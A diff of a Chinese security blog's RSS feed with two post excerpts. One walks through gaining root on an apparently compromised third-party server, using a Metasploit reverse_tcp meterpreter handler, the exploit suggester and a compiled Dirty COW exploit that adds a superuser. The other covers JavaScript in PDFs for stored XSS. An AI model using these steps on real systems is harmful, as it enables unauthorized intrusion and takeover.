@@ -1,25 +1,21 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>渗透 on AFTERMORR0W</title>
-    <link>https://aftermorr0w.github.io/tags/%E6%B8%97%E9%80%8F/</link>
-    <description>Recent content in 渗透 on AFTERMORR0W</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en</language>
-    <lastBuildDate>Tue, 13 Sep 2022 19:52:48 +0800</lastBuildDate><atom:link href="https://aftermorr0w.github.io/tags/%E6%B8%97%E9%80%8F/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>对某傀儡机的提权操作</title>
-      <link>https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/</link>
-      <pubDate>Tue, 13 Sep 2022 19:52:48 +0800</pubDate>
-      
-      <guid>https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/</guid>
-      <description>前言 链接：https://aftermorr0w.github.io/posts/pdf%E5%86%99%E5%85%A5javascript%E9%80%A0%E6%88%90xss/
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>渗透 - Tag - AFTERMORR0W</title>
+        <link>https://aftermorr0w.github.io/tags/%E6%B8%97%E9%80%8F/</link>
+        <description>渗透 - Tag - AFTERMORR0W</description>
+        <generator>Hugo -- gohugo.io</generator><lastBuildDate>Tue, 13 Sep 2022 19:52:48 &#43;0800</lastBuildDate><atom:link href="https://aftermorr0w.github.io/tags/%E6%B8%97%E9%80%8F/" rel="self" type="application/rss+xml" /><item>
+    <title>对某傀儡机的提权操作</title>
+    <link>https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/</link>
+    <pubDate>Tue, 13 Sep 2022 19:52:48 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/</guid>
+    <description><![CDATA[前言 链接：https://aftermorr0w.github.io/posts/pdf%E5%86%99%E5%85%A5javascript%E9%80%A0%E6%88%90xss/
 我们废了半天劲拿下了他的服务器，现在回过头来对其linux服务器进行提权
 还是使用我们万能的msf 这里介绍的是suggester模块，该模块可以教我们如何快速的查找目标可用的提权EXP
 设置session 我们先连上我们的msf 设置一个session vps操作
-use exploit/multi/handler set payload php/meterpreter/reverse_tcp show options set lhost 0.0.0.0 run 我们会获取一个会话session
-suggester查找有用EXP background search suggester use 0 options set session 1 run 真TM牛逼，还以为是个好的文章素材呢，这就翻车了
-赃牛提权CVE-2016-5195 Linux kernel &amp;gt;= 2.6.22（2007年发行，到2016年10月18日才修复）
+use exploit/multi/handlerset payload php/meterpreter/reverse_tcpshow optionsset lhost 0.0.0.0run 我们会获取一个会话session
+suggester查找有用EXP backgroundsearch suggesteruse 0optionsset session 1run 真TM牛逼，还以为是个好的文章素材呢，这就翻车了
+赃牛提权CVE-2016-5195 Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）
 uname -a 查看linus内核 刚好满足赃牛提权的条件
 那就试一试
 利用exp2 应该是这个服务器的gcc版本问题，exp1失败了
@@ -28,16 +24,15 @@ upload filename_path path 将exp传到傀儡机
 到达exp的目录 然后运行make编译 make如果不成功 运行下面的指令也一样
 gcc -pthread dirty.c -o dirty –lcrypt 然后再运行./dirty 会让你输入new password 这个就是给你创建一个新的超级管理员用户
 添加的时候会需要等一会
-然后su - firefart 切换用户 报错： standard in must be a tty</description>
-    </item>
-    
-    <item>
-      <title>PDF写入javascript造成XSS</title>
-      <link>https://aftermorr0w.github.io/posts/pdf%E5%86%99%E5%85%A5javascript%E9%80%A0%E6%88%90xss/</link>
-      <pubDate>Sun, 03 Apr 2022 12:55:15 +0800</pubDate>
-      
-      <guid>https://aftermorr0w.github.io/posts/pdf%E5%86%99%E5%85%A5javascript%E9%80%A0%E6%88%90xss/</guid>
-      <description>前言 前几天了解了PDF XSS 感觉这是个特别有意思的知识点，确实XSS称霸漏洞排行榜前几以来，哪个不知道见框就插，把代码写入点写死或者加上过滤你就没辙了
+然后su - firefart 切换用户 报错： standard in must be a tty]]></description>
+</item>
+<item>
+    <title>PDF写入javascript造成XSS</title>
+    <link>https://aftermorr0w.github.io/posts/pdf%E5%86%99%E5%85%A5javascript%E9%80%A0%E6%88%90xss/</link>
+    <pubDate>Sun, 03 Apr 2022 12:55:15 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://aftermorr0w.github.io/posts/pdf%E5%86%99%E5%85%A5javascript%E9%80%A0%E6%88%90xss/</guid>
+    <description><![CDATA[前言 前几天了解了PDF XSS 感觉这是个特别有意思的知识点，确实XSS称霸漏洞排行榜前几以来，哪个不知道见框就插，把代码写入点写死或者加上过滤你就没辙了
 介绍 Pdf文件是应用广泛的一种文件格式，发展至今已经到了2.0版本，其功能也得到了不断丰富，很多鲜为人知的功能可能会被利用实施恶意行为。本文将简单介绍在pdf文件 中嵌入Javasript脚本的利用方式。
 很多针对Adobe阅读器的CVE漏洞都是通过pdf文件中的某些结构触发，触发过程都需要执行事先嵌入在pdf文件中的Javascript脚本
 主要的利用方式
@@ -49,8 +44,7 @@ app.launchURL()、app.media.getURLdata()、app.alert()、app.execDialog()、doc.
 这里需要注意的是：Adobe 支持自身的 JavaScript 对象模型，例如 alert(‘xss’)必须被 APP 对象调用，因此变成了 app.alert(‘xss’)。这意味着，利用 JavaScript 进行攻击时只能使用 Adobe 所支持的功能。
 经过测试，目前火狐、谷歌、360、edge都支持 换言之，只要存在在线打开浏览文件的功能点就存在存储型XSS
 PDF中可以藏恶意代码了是不是可以将这个漏洞扩展一下
-参考链接： https://www.cnblogs.com/xiaozi/p/9951622.html</description>
-    </item>
-    
-  </channel>
+参考链接： https://www.cnblogs.com/xiaozi/p/9951622.html]]></description>
+</item>
+</channel>
 </rss>
